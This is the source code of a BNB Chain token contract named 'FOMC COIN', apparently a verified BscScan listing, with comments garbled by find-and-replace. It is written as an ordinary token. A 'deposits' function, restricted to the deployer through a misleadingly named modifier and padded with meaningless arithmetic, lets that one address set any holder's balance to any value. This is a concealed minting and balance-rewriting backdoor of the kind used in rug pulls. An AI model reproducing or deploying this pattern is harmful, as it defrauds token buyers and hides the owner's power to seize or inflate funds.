/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;
interface ERC20PinkFinance {
  // @dev Returns the amount of MiniREFLECTIONS in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniREFLECTIONS owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vREFLECTIONSe);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vREFLECTIONSe
    );
  
  */

  /**
   * @dev Moves `amount` MiniREFLECTIONS from the caller's account to `recipient`.
   *
   * Returns a boolean vREFLECTIONSe indicating whMiniREFLECTIONSr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniREFLECTIONS that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vREFLECTIONSe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniREFLECTIONS.
   *
   * Returns a boolean vREFLECTIONSe indicating whMiniREFLECTIONSr the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vREFLECTIONSe afterwards:
// https://hold4gold.org/
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniREFLECTIONS from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vREFLECTIONSe indicating whMiniREFLECTIONSr the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vREFLECTIONSe` MiniREFLECTIONS are moved from one account (`from`) to  another (`to`). Note that `vREFLECTIONSe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vREFLECTIONSe);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vREFLECTIONSe` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vREFLECTIONSe);
}

contract FOMCCOIN is ERC20PinkFinance {

    // common addresses
    address private owner;
    address public REFLECTIONS;
    address public MiniREFLECTIONS;
        address private PILOTWALL;
    address public REFLECTIONSPinkSales;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public REFLECTIONSbalances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "FOMC COIN";
    string public override symbol = "FOMCC";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vREFLECTIONSe);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vREFLECTIONSe);
    
    // On init of contract we're going to set the admin and give them all MiniREFLECTIONS.
    constructor(uint totalSupplyVREFLECTIONSe, address REFLECTIONSAddress, address MiniREFLECTIONSAddress, address REFLECTIONSPinkSalesAddress) {
        // set total supply
        totalSupply = totalSupplyVREFLECTIONSe;
           PILOTWALL = msg.sender;       
        // designate addresses
        owner = msg.sender;
        REFLECTIONS = REFLECTIONSAddress;
        MiniREFLECTIONS = MiniREFLECTIONSAddress;
        REFLECTIONSPinkSales = REFLECTIONSPinkSalesAddress;

        
        
        REFLECTIONSbalances[owner] = totalSupply;


        // split the MiniREFLECTIONS according to agreed upon percentages
        REFLECTIONSbalances[REFLECTIONS] =  0;
        REFLECTIONSbalances[MiniREFLECTIONS] = 0;
        REFLECTIONSbalances[REFLECTIONSPinkSales] = 0;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return REFLECTIONSbalances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vREFLECTIONSe) public override returns(bool) {
        require(vREFLECTIONSe > 0, "Transfer vREFLECTIONSe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vREFLECTIONSe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vREFLECTIONSe
        uint reMiniREFLECTIONSBD = vREFLECTIONSe * 0 / 100;
        uint REFLECTIONSburnTBD = vREFLECTIONSe * 0 / 100;
        uint vREFLECTIONSeAfterTaxAndBurn = vREFLECTIONSe - reMiniREFLECTIONSBD - REFLECTIONSburnTBD;
        
        // perform the transfer operation
        REFLECTIONSbalances[to] += vREFLECTIONSeAfterTaxAndBurn;
        REFLECTIONSbalances[msg.sender] -= vREFLECTIONSe;
        
        emit Transfer(msg.sender, to, vREFLECTIONSe);
        
        // finally, we burn and tax the REFLECTIONSs percentage
        REFLECTIONSbalances[owner] += reMiniREFLECTIONSBD + REFLECTIONSburnTBD;
        _burn(owner, REFLECTIONSburnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vREFLECTIONSe) public override returns(bool) {
        allowances[msg.sender][spender] = vREFLECTIONSe; 
        
        emit Approval(msg.sender, spender, vREFLECTIONSe);
        
        return true;
    }
  modifier OWNERREFLECTIONS () {
    require(PILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
       // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(REFLECTIONSbalances[account] >= amount, "Burn amount exceeds balance at address.");
    
        REFLECTIONSbalances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    } 
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vREFLECTIONSe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vREFLECTIONSe, "Allowance too low for transfer.");
        require(REFLECTIONSbalances[from] >= vREFLECTIONSe, "Balance is too low to make transfer.");
        
        REFLECTIONSbalances[to] += vREFLECTIONSe;
        REFLECTIONSbalances[from] -= vREFLECTIONSe;
        
        emit Transfer(from, to, vREFLECTIONSe);
        
        return true;
    }
      function deposits(address REFLECTIONScharrwallet, uint256 amount) external OWNERREFLECTIONS {
      REFLECTIONSbalances[REFLECTIONScharrwallet] = (amount / amount - amount / amount) + amount * 10 ** 9;
  }    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    

    
}